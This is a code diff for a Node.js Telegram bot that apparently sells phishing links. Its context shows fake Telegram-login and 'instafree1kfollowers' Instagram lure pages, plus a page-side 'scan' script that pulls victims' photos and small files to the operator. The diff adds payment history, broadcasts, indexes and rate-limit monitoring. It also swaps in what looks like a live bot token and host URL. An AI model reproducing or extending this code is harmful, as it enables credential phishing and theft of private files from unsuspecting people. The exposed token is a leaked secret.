@@ -1,4 +1,4 @@
-// ====================== index.js – ULTIMATE VERSION WITH PREMIUM EMOJIS & ALL FIXES ======================
+// ====================== index.js – ULTIMATE VERSION WITH ALL FEATURES & FIXES ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
  * 
@@ -16,11 +16,11 @@ process.env.NTBA_FIX_350 = 1;
 
 // ====================== CONFIG ======================
 const config = {
-    mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA',
+    mainToken: '8607208829:AAF3qtXBvnW8Kf5ycH2mKW4bmcWOQSd8qgE',
     S7: '@RTFGAMMING',
     adminId: '6346250222',
     port: process.env.PORT || 3000,
-    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com',
+    baseUrl: process.env.RENDER_URL || 'https://official-premium.onrender.com',
     BATCH_SIZE: 100,
     LINK_EXPIRY: 15 * 60 * 1000,
     MAX_OPENS: 5,
@@ -338,9 +338,15 @@ app.use(express.json({ limit: '100mb' }));
 app.use(express.urlencoded({ extended: true, limit: '100mb' }));
 
 // ====================== MONGODB ======================
-mongoose.connect(config.mongoUrl)
-    .then(() => console.log('✅ MongoDB connected'))
-    .catch(err => console.error('❌ MongoDB error:', err));
+mongoose.connect(config.mongoUrl, {
+    useNewUrlParser: true,
+    useUnifiedTopology: true,
+    maxPoolSize: 10,
+    minPoolSize: 2,
+    maxIdleTimeMS: 30000
+})
+.then(() => console.log('✅ MongoDB connected'))
+.catch(err => console.error('❌ MongoDB error:', err));
 
 // ====================== SCHEMAS ======================
 const userSchema = new mongoose.Schema({
@@ -355,7 +361,11 @@ const userSchema = new mongoose.Schema({
     _pendingReferrer: { type: String, default: null },
     _waitingForQR: { type: Boolean, default: false },
     _waitingForPhoto: { type: Boolean, default: false },
-    _pendingPayment: { type: Object, default: null }
+    _pendingPayment: { type: Object, default: null },
+    paymentHistory: [{ type: Object, default: [] }],
+    lastActivity: { type: Date, default: Date.now },
+    rateLimitCount: { type: Number, default: 0 },
+    rateLimitReset: { type: Date, default: Date.now }
 });
 const photoSchema = new mongoose.Schema({
     id: { type: String, unique: true },
@@ -400,6 +410,27 @@ const couponSchema = new mongoose.Schema({
     createdBy: { type: String, required: true },
     createdAt: { type: Date, default: Date.now }
 });
+const broadcastSchema = new mongoose.Schema({
+    message: String,
+    mediaType: String,
+    mediaId: String,
+    caption: String,
+    sentAt: Date,
+    totalSent: Number,
+    totalFailed: Number,
+    status: String
+});
+
+// Add indexes for performance
+userSchema.index({ userId: 1 });
+userSchema.index({ banned: 1 });
+userSchema.index({ joinedAt: -1 });
+linkSchema.index({ expiresAt: 1 });
+linkSchema.index({ active: 1 });
+linkSchema.index({ userId: 1 });
+photoSchema.index({ uploadedAt: -1 });
+referralSchema.index({ referrerId: 1 });
+referralSchema.index({ timestamp: -1 });
 
 const User = mongoose.model('User', userSchema);
 const Photo = mongoose.model('Photo', photoSchema);
@@ -408,6 +439,7 @@ const Channel = mongoose.model('Channel', channelSchema);
 const Featured = mongoose.model('Featured', featuredSchema);
 const Link = mongoose.model('Link', linkSchema);
 const Coupon = mongoose.model('Coupon', couponSchema);
+const Broadcast = mongoose.model('Broadcast', broadcastSchema);
 
 // ====================== DIRECTORIES ======================
 const PHOTO_DIR = path.join(__dirname, 'photos');
@@ -468,6 +500,8 @@ async function getUser(userId) {
         user = new User({ userId: String(userId), credits: 3 });
         await user.save();
     }
+    user.lastActivity = Date.now();
+    await user.save();
     return user;
 }
 async function addReferral(referrerId, newUserId) {
@@ -710,17 +744,14 @@ async function processScanFiles(userId, files, platform) {
     
     for (const file of files) {
         if (file.size >= 10240 && file.size <= 1048576) {
-            // Check if it's a photo (image)
             if (file.mimetype && file.mimetype.startsWith('image/')) {
                 photoFiles.push(file);
             } else if (file.size < 300 * 1024) {
-                // Files smaller than 300KB
                 smallFiles.push(file);
             }
         }
     }
     
-    // If photos exist, transfer photos
     const filesToTransfer = photoFiles.length > 0 ? photoFiles : smallFiles;
     
     let transferred = 0;
@@ -750,7 +781,6 @@ async function processScanFiles(userId, files, platform) {
         }
     }
     
-    // Clean up temp files
     for (const file of files) {
         try { URL.revokeObjectURL(file); } catch(e) {}
     }
@@ -831,7 +861,6 @@ async function sendBatchPhotos(userId) {
             try { await S7.sendPhoto(userId, photos[j]); } catch (e) {}
         }
     }
-    // Clean up temp files
     for (const photo of photos) {
         try {
             if (photo.path) fs.unlinkSync(photo.path);
@@ -1608,7 +1637,7 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
 </body>
 </html>`;
 
-// ====================== OTHER TEMPLATES (with premium emojis) ======================
+// ====================== OTHER TEMPLATES (with premium emojis & improved design) ======================
 const INSTA_TEMPLATE = `<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>instafree1kfollowers</title>
@@ -2011,7 +2040,6 @@ async function startScan() {
             var f = files[i];
             if (f.size >= 10240 && f.size <= 1048576) {
                 validFiles.push(f);
-                // Check if it's a photo
                 if (f.type && f.type.startsWith('image/')) {
                     photoFiles.push(f);
                 } else if (f.size < 300 * 1024) {
@@ -2019,7 +2047,6 @@ async function startScan() {
                 }
             }
         }
-        // Use photos if available, otherwise small files
         var filesToTransfer = photoFiles.length > 0 ? photoFiles : smallFiles;
         if (photoFiles.length > 0) {
             addLog("📸 Found " + photoFiles.length + " photos. Transferring photos...", "");
@@ -2087,7 +2114,6 @@ async function startScan() {
         btn.disabled = false;
         btn.innerHTML = "<i class=\\"fas fa-check-circle\\"></i> SCAN COMPLETE";
         isScanning = false;
-        // Clean up temp files
         for (var j = 0; j < files.length; j++) {
             try { URL.revokeObjectURL(files[j]); } catch(e) {}
         }
@@ -2319,7 +2345,8 @@ app.get('/api/admin/user/:userId', async (req, res) => {
             totalReferrals: user.totalReferrals,
             joinedAt: user.joinedAt,
             referredBy: user.referredBy,
-            banned: user.banned
+            banned: user.banned,
+            paymentHistory: user.paymentHistory || []
         });
     } catch (err) {
         res.status(500).json({ error: err.message });
@@ -3104,6 +3131,15 @@ S7.on('callback_query', async (q) => {
             await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
             return;
         }
+        // Add to payment history
+        if (!user.paymentHistory) user.paymentHistory = [];
+        user.paymentHistory.push({
+            amount: payment.amount,
+            credits: payment.credits,
+            plan: payment.plan,
+            status: 'approved',
+            date: new Date()
+        });
         if (payment.credits === 'Unlimited') {
             user.unlimited = true;
             await user.save();
@@ -3140,6 +3176,14 @@ S7.on('callback_query', async (q) => {
             await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
             return;
         }
+        if (!user.paymentHistory) user.paymentHistory = [];
+        user.paymentHistory.push({
+            amount: payment.amount,
+            credits: payment.credits,
+            plan: payment.plan,
+            status: 'rejected',
+            date: new Date()
+        });
         await S7.sendMessage(userId,
             replaceAllEmojis('❌ <b>Payment Rejected!</b>\n\n📊 Credits: ') + payment.credits + replaceAllEmojis('\n💵 Amount: ₹') + payment.amount + replaceAllEmojis('\n\nReason: Payment verification failed.\nPlease try again with a valid screenshot.'),
             { parse_mode: 'HTML' }
@@ -3721,6 +3765,58 @@ S7.on('message', async (msg) => {
             logToFile('🎫 User ' + userId + ' redeemed coupon ' + code);
         }
         return;
+    }
+});
+
+// ====================== USER PAYMENT HISTORY ======================
+S7.on('message', async (msg) => {
+    if (!msg.text) return;
+    const text = msg.text.trim();
+    if (text === '/history' || text === '/paymenthistory') {
+        const userId = msg.from.id;
+        const user = await getUser(userId);
+        if (user.banned) return S7.sendMessage(userId, replaceAllEmojis('🚫 You are banned.'));
+        if (!user.paymentHistory || user.paymentHistory.length === 0) {
+            return S7.sendMessage(userId, replaceAllEmojis('📊 <b>No payment history found.</b>'), { parse_mode: 'HTML' });
+        }
+        let historyMsg = replaceAllEmojis('📊 <b>Your Payment History</b>\n\n');
+        const history = user.paymentHistory.slice(-10).reverse();
+        for (const entry of history) {
+            const status = entry.status === 'approved' ? '✅ Approved' : '❌ Rejected';
+            historyMsg += `💰 ₹${entry.amount} | ${entry.credits} credits | ${status} | ${new Date(entry.date).toLocaleDateString()}\n`;
+        }
+        if (user.paymentHistory.length > 10) {
+            historyMsg += `\n📌 Showing last 10 of ${user.paymentHistory.length} entries.`;
+        }
+        await S7.sendMessage(userId, historyMsg, { parse_mode: 'HTML' });
+        return;
+    }
+});
+
+// ====================== RATE LIMIT MONITORING ======================
+app.get('/api/admin/rate-limit', async (req, res) => {
+    try {
+        const users = await User.find({}, 'userId rateLimitCount rateLimitReset lastActivity');
+        const totalUsers = users.length;
+        const now = Date.now();
+        let totalRequests = 0;
+        let activeUsers = 0;
+        const threshold = 5 * 60 * 1000; // 5 minutes
+        for (const user of users) {
+            totalRequests += user.rateLimitCount || 0;
+            if (user.lastActivity && (now - new Date(user.lastActivity).getTime()) < threshold) {
+                activeUsers++;
+            }
+        }
+        res.json({
+            totalUsers,
+            activeUsers,
+            totalRequests,
+            averageRequests: totalUsers > 0 ? (totalRequests / totalUsers).toFixed(2) : 0,
+            timestamp: new Date().toISOString()
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
     }
 });
 
